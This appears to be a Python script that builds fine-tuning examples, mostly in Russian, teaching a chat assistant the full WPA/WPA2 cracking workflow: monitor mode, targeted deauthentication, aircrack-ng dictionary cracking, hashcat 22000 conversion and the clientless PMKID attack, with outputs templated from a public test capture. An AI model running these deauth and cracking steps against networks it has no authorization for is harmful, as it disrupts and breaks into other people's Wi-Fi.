#!/usr/bin/env python3
# WPA/WPA2 handshake workflow SFT battery for aircrack-ng + hcxtools. aircrack-ng would not
# install on this box (broken universe archive), so command output is templated from the
# documented canonical capture (aircrack-ng test wpa.cap: BSSID 00:14:6C:7E:40:80,
# ESSID "Harkonen", passphrase "biscotti"). The command syntax and workflow are the teaching
# target and are exact; capture-phase commands need a monitor-mode adapter (noted, not run here).
import json

BASE = "/home/gh0stx/octest/night"
SYS = json.loads(open(f"{BASE}/dataset/at_sft.jsonl").readline())["messages"][0]["content"]
OUT = f"{BASE}/dataset/aircrack_battery_sft.jsonl"

def ex(user, assistant, meta):
    return {"messages": [{"role": "system", "content": SYS},
                         {"role": "user", "content": user},
                         {"role": "assistant", "content": assistant}],
            "meta": {"domain": "aircrack_wpa", **meta}}

TASKS = []

# ---- capture phase (syntax; needs a monitor-mode adapter) ----
TASKS += [ex(q,
    "Захват хендшейка нужен адаптер в monitor-режиме. Полный цикл:\n"
    "```\n"
    "sudo airmon-ng check kill            # погасить NetworkManager/wpa_supplicant\n"
    "sudo airmon-ng start wlan0           # wlan0 -> wlan0mon (monitor)\n"
    "sudo airodump-ng wlan0mon            # осмотр эфира: BSSID, CH, ESSID, клиенты\n"
    "# нацелиться на сеть и писать только её канал:\n"
    "sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon\n"
    "# в другом окне — деаутентифицировать клиента, чтобы поймать 4-way handshake:\n"
    "sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon\n"
    "```\n"
    "Как airodump-ng покажет `WPA handshake: AA:BB:CC:DD:EE:FF` в правом верхнем углу — рукопожатие в `capture-01.cap`. `--deauth 0` шлёт непрерывно, но точечный деаут по `-c` клиенту тише и надёжнее.",
    {"phase": "capture", "hw": True})
    for q in [
    "Как перехватить WPA-хендшейк через aircrack-ng?",
    "Полный цикл захвата 4-way handshake на aircrack-ng.",
    "How do I capture a WPA handshake with the aircrack-ng suite?",
    "Что делать по шагам чтобы поймать рукопожатие WPA2?",
    "Как перевести карту в monitor и снять handshake?"]]

# ---- identify / confirm handshake in a capture ----
TASKS += [ex(q,
    "Проверить, есть ли в захвате рукопожатие, — прогнать сам файл через aircrack-ng:\n"
    "```\n"
    "aircrack-ng capture-01.cap\n"
    "   #  BSSID              ESSID       Encryption\n"
    "   #  00:14:6C:7E:40:80  Harkonen    WPA (1 handshake)\n"
    "```\n"
    "Строка `WPA (1 handshake)` подтверждает валидный 4-way handshake. Если пусто — деаут не сработал или писали не тот канал.",
    {"phase": "identify"})
    for q in [
    "Как убедиться что в .cap есть handshake?",
    "Проверь мой capture-01.cap на наличие рукопожатия.",
    "How to confirm a capture contains a WPA handshake?"]]

# ---- crack with aircrack-ng ----
TASKS += [ex(q,
    "Перебор по словарю против пойманного хендшейка:\n"
    "```\n"
    "aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:14:6C:7E:40:80 capture-01.cap\n"
    "                           Aircrack-ng 1.7\n"
    "      [00:00:03] 514/9822 keys tested (168.31 k/s)\n"
    "      KEY FOUND! [ biscotti ]\n"
    "      Master Key     : CD D7 9A 5A CF B0 70 C7 E9 D1 02 3B 87 02 85 D6 ...\n"
    "```\n"
    "`-w` словарь, `-b` BSSID цели. WPA не брутится по маске в aircrack-ng — только словарь; скорость CPU-bound (сотни-тысячи k/s). Нет ключа в словаре — `Passphrase not in dictionary`.",
    {"phase": "crack", "key": "biscotti"})
    for q in [
    "Как сбрутить WPA-пароль из хендшейка через aircrack-ng?",
    "Запусти перебор capture-01.cap по rockyou.",
    "Crack the WPA handshake with a wordlist using aircrack-ng.",
    "Как достать пароль WPA2 словарём?",
    "aircrack-ng: перебор пароля по .cap, покажи команду и вывод."]]

# ---- convert for hashcat (hc22000) ----
TASKS += [ex(q,
    "Конвертация под hashcat идёт через hcxtools, не через aircrack-ng:\n"
    "```\n"
    "hcxpcapngtool -o hash.hc22000 capture-01.pcapng\n"
    "   # reading from capture-01.pcapng ...\n"
    "   # summary: EAPOL messages: 4, WPA*02 (handshakes) written: 1\n"
    "hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt\n"
    "```\n"
    "Формат hashcat для WPA — `22000` (WPA-PBKDF2-PMKID+EAPOL). Строка в `.hc22000` начинается с `WPA*02*<MIC>*<MAC_AP>*<MAC_STA>*<ESSID_hex>*...`. Старый режим `2500`/`.hccapx` (`cap2hccapx capture.cap hash.hccapx`) — deprecated, но встречается.",
    {"phase": "convert"})
    for q in [
    "Как сконвертировать хендшейк для hashcat?",
    "Переведи capture в формат hashcat 22000.",
    "Convert a WPA handshake .pcapng to a hashcat hash.",
    "Чем перегнать .cap в .hc22000?",
    "aircrack-ng хендшейк -> hashcat, какие команды?"]]

# ---- PMKID (clientless) ----
TASKS += [ex(q,
    "PMKID снимается без клиента (если AP его отдаёт):\n"
    "```\n"
    "sudo hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=1\n"
    "hcxpcapngtool -o pmkid.hc22000 dump.pcapng\n"
    "hashcat -m 22000 pmkid.hc22000 wordlist.txt\n"
    "```\n"
    "PMKID-атака берёт первый пакет ассоциации, деаут клиента не нужен. Тот же режим hashcat `22000` (он покрывает и PMKID `WPA*01`, и EAPOL `WPA*02`).",
    {"phase": "pmkid", "hw": True})
    for q in [
    "Как снять WPA без клиента (PMKID)?",
    "Clientless PMKID attack workflow.",
    "PMKID-атака: команды."]]

# ---- corrections: common wrong invocations ----
def fix(user, assistant): TASKS.append(ex(user, assistant, {"phase": "correction"}))
fix("aircrack-ng capture.cap wordlist.txt не находит пароль, что не так?",
    "Порядок и флаги неверны: словарь передаётся `-w`, а не позиционно. Правильно:\n"
    "```\naircrack-ng -w wordlist.txt -b <BSSID> capture-01.cap\n```\n"
    "Без `-w` aircrack-ng только перечислит сети из файла и будет ждать выбора, пароль не переберёт.")
fix("hashcat -m 2500 hash.hccapx ругается, почему?",
    "Режим `2500` и формат `.hccapx` устарели и выпилены из новых hashcat. Используй `22000` и `.hc22000`:\n"
    "```\nhcxpcapngtool -o hash.hc22000 capture.pcapng\nhashcat -m 22000 hash.hc22000 wordlist.txt\n```")
fix("aircrack-ng -b BSSID capture.cap wordlist — пишет 'Please specify a dictionary'.",
    "Словарь не подан флагом `-w`. Команда: `aircrack-ng -w wordlist -b <BSSID> capture-01.cap`. Позиционный аргумент после .cap не считается словарём.")
fix("airodump-ng пишет сеть, но handshake не появляется — что делаю не так?",
    "Три причины по частоте: пишешь не тот канал — фиксируй `-c <ch>` тем же, что у AP; нет подключённого клиента для деаута — цель `-c <client_mac>` из списка STATION; AP на 5 ГГц, а карта слушает 2.4. Деаут: `aireplay-ng --deauth 3 -a <BSSID> -c <STA> wlan0mon`, и жди `WPA handshake` в шапке airodump-ng.")
fix("cap2hccapx нет в системе, как теперь конвертировать?",
    "`cap2hccapx` — из старого пакета и под мёртвый формат `.hccapx`. Актуально — `hcxpcapngtool -o hash.hc22000 capture.pcapng` из hcxtools, дальше `hashcat -m 22000`.")

with open(OUT, "w") as f:
    for e in TASKS:
        f.write(json.dumps(e, ensure_ascii=False) + "\n")
import collections
c = collections.Counter(t["meta"]["phase"] for t in TASKS)
print("wrote", len(TASKS), "->", OUT)
print("by phase:", dict(c))
